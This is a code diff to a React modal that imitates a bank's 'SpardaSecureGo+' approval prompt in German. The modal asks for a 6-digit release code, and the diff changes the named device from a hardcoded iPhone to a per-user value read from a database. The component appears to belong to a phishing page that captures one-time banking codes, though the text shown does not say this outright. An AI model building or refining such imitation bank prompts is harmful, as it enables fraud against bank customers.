@@ -1,6 +1,7 @@
 import React, { useState } from 'react';
 
-function SecureGoModal({ isOpen, onClose, onConfirm, isSubmitting = false }) {
+// ─── ⚡ DYNAMIC: ACCEPT INJECTED USER PROP FROM THE DATABASE ───
+function SecureGoModal({ isOpen, onClose, onConfirm, isSubmitting = false, user }) {
   const [code, setCode] = useState('');
 
   if (!isOpen) return null;
@@ -12,6 +13,10 @@ function SecureGoModal({ isOpen, onClose, onConfirm, isSubmitting = false }) {
     }
   };
 
+  // ─── ⚡ STRICT DATABASE BINDING FOR DEVICE NAME ───
+  // Completely dynamic: pulls whatever device is tied to the user's database row
+  const deviceName = user?.device_name || user?.securego_device || '';
+
   return (
     <div className="modal-overlay show" id="securego-modal">
       <div className="modal-box">
@@ -20,7 +25,7 @@ function SecureGoModal({ isOpen, onClose, onConfirm, isSubmitting = false }) {
         <h3>SpardaSecureGo+ Freigabe</h3>
 
         <p>
-          Eine Push-Benachrichtigung wurde an Ihr iPhone 14 Pro gesendet.
+          Eine Push-Benachrichtigung wurde an <strong>{deviceName}</strong> gesendet.
           <br />
           Oder geben Sie Ihren 6-stelligen Freigabecode ein:
         </p>
